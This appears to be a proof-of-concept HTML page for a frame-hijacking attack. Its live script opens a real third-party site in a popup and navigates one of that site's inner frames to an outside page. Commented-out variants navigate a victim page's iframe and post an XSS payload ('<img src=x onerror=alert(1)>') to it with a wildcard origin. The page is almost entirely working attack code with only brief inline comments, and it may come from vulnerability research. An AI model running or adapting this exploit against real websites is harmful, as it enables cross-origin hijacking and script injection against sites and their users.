<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>Test</h1>
    <button onclick="openNewTab()">Open New Tab</button>

    <script>
        // Method 1: Open a new tab, then hijack the iframe by targeting its name
        // function openNewTab() {
        //     // 1. Open victim.html (which contains <iframe name="myframe">)
        //     window.open("victim.html", "_blank", "width=500,height=500");

        //     // 2. Hijack the iframe by targeting its name â€” navigates it to victim.html
        //     setTimeout(function() {
        //         let x = window.open("victim.html", "myframe");

        //         // 3. Wait for the hijacked iframe to load, then postMessage to it
        //         setTimeout(function() {
        //             // x.postMessage("badr", '*');
        //             x.postMessage("<img src=x onerror=alert(1)>", '*');
        //         }, 2000);
        //     }, 2000);
        // }

        // Method 2: Open a new tab, then hijack the iframe by targeting its index
        // function openNewTab() {
        //     let w = window.open("victim.html", "_blank", "width=500,height=500");
        //     setTimeout(() => {
        //         // Navigate inner iframe
        //         w.frames[0].location = "victim.html";
        //     }, 2000);
        //     setTimeout(() => {
        //         // Post message to inner iframe
        //         w.frames[0].postMessage("<img src=x onerror=alert(1)>", '*');
        //     }, 2500);
        // }

        // live demo
        function openNewTab() {
            let w = window.open("https://www.files.com/", "_blank", "width=500,height=500");
            setTimeout(() => {
                // Navigate inner iframe
                w.frames[1].location = "https://daemoon.me/alert.html";
            }, 2000);
            // setTimeout(() => {
            //     // Post message to inner iframe
            //     w.frames[0].postMessage("<img src=x onerror=alert(1)>", '*');
            // }, 2500);
        }
    </script>

    
    <!-- <iframe name="myframe" width="1000" height="400"></iframe>
    <script>
        function openNewTab() {
            var x = window.open("victim.html", "myframe");

            setTimeout(function() {
                x.frames[0].location.href = "victim.html";
            }, 2000);
            
            setTimeout(function() {
                x.frames[0].postMessage("badr",'*');
            }, 2500);
        }
        // no need to iframe
        // just redirect the iframe to the victim page, then postMessage to it
        // setTimeout(function() {
        //     document.querySelector('iframe').src = "victim.html";
        // }, 2000);
    </script> -->
</body>
</html>